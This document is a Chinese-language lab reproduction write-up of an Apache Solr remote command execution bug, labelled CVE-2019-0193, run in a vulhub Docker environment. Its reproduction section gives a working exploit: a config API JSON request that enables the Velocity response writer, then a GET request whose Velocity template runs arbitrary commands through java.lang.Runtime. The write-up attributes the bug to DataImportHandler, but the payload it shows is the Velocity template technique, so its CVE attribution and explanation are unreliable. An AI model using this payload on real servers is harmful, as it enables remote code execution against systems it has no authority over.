---
description: CVE-2019-0193
---

# Apache Solr 远程命令执行漏洞（CVE-2019-0193）

以下内容来自「[是大方子-Apache Solr 远程命令执行漏洞（CVE-2019-0193）](https://note.youdao.com/ynoteshare1/index.html?id=59ba4b4d77327e0b12cfb9a67f114956&type=note)」，我看了他写的复现报告之后，认为写的还可以，并搭建环境完成了复现，具体内容如下：

## 0x00 准备工作

漏洞环境可以采用vulhub的github：

* [https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193)

漏洞原理与分析可以参考：

* [https://mp.weixin.qq.com/s/typLOXZCev\_9WH\_Ux0s6oA](https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA)
* [https://paper.seebug.org/1009/](https://paper.seebug.org/1009/)

## 0x01 Solr简介

Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。

## 0x02 漏洞概述

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。本环境测试RCE漏洞。  
  
漏洞影响范围：Apache Solr &lt;= 8.2.0，Apache Solr 5.x - 8.2.0，存在config API版本

## 0x03 漏洞环境

运行漏洞环境：

```text
docker-compose up -d
```

```bash
docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db
```

访问环境

```text
http://10.26.231.203:8983/solr/#/
```

访问test的配置文件

![](../../../.gitbook/assets/image%20%288%29.png)

```text
http://10.26.231.203:8983/solr/test/config
```

## 0x04 漏洞复现

访问上述网址并抓包并修改发送方式为POST，然后利用s00py公布的poc修改向config发送json配置继续修改

```text
{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

{% hint style="danger" %}
注意：图示这2个位置要修改
{% endhint %}

![](../../../.gitbook/assets/image%20%286%29.png)

然后就可以进行RCE

```text
GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: 10.26.231.203:8983
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Connection: close
```

![](https://note.youdao.com/yws/public/resource/59ba4b4d77327e0b12cfb9a67f114956/xmlnote/6A6CE5A6CCFA4F589061DB43FAF99AC4/73795)

